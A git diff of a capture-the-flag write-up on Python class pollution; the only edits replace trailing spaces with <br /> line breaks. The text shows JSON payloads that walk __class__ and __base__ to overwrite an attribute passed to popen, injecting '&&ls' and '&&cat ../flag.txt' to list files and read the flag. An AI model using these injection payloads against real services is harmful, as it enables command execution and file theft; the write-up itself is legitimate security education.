@@ -37,13 +37,13 @@ We want `king.modt` to return `f'''{popen('echo ' + say).read().strip()}!'''`, s
 
 Why does this work? Well, i won't tell you. You will probably learn more if you try to understand it yourself. You can use google and a debugger like trepan-xpy.
 
-next, we take a look on how the king shouts our message. it uses:  
+next, we take a look on how the king shouts our message. it uses:<br />
 `popen("echo " + say).read().strip()`  
-So, it just runs the bash command 'echo our_message'. We can easily inject some code there, for example by using:  
+So, it just runs the bash command 'echo our_message'. We can easily inject some code there, for example by using:<br />
 `{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls"}}}}}`
-to get the files in the current directory. using:  
+to get the files in the current directory. using:<br />
 `{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&ls ../"}}}}}`
-we see where the flag is, and print it using:  
+we see where the flag is, and print it using:<br />
 `{"__class__":{"__base__":{"__base__":{"__base__":{"shout":"&&cat ../flag.txt"}}}}}`  
-
+<br />
 It outputs the flag: DBH{p0llu710n_15_n0t_jU57_4_j4v45cr1p7_th1nG}
